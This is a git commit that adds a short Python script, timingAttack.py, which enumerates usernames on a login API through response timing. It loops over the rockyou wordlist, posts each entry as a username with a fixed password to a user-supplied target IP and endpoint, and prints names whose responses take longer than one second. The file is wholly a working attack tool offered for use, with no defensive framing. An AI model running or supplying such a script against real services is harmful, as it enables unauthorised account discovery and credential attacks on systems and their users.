e37f22e92eb36ab0c48337a215db5e92a104fc9f
Vikash Kumar <67106713+vikashkr99@users.noreply.github.com>
2022-08-22 21:35:40 +0530

    Add files via upload

---
+++ timingAttack.py
@@ -0,0 +1,24 @@
+#!/bin/python3
+
+#Timing attack to enumerate username
+
+import requests
+import time
+
+f = open("/usr/share/wordlists/rockyou.txt", "r")
+
+ip = input("Enter target ip: ")
+apiEndpoint = input("Enter api endpoint location: ")
+url = (f"http://{ip}{apiEndpoint}")
+
+for i in f:
+    creds = {"username": i.strip(), "password": "password123"}
+    # print(creds)
+    sTime = time.time()
+    x = requests.post(url, json=creds)
+    eTime = time.time()
+
+    diff = eTime-sTime
+
+    if diff > 1:
+        print(f"Possible Username: {str(diff)[0]} {i.strip()}")
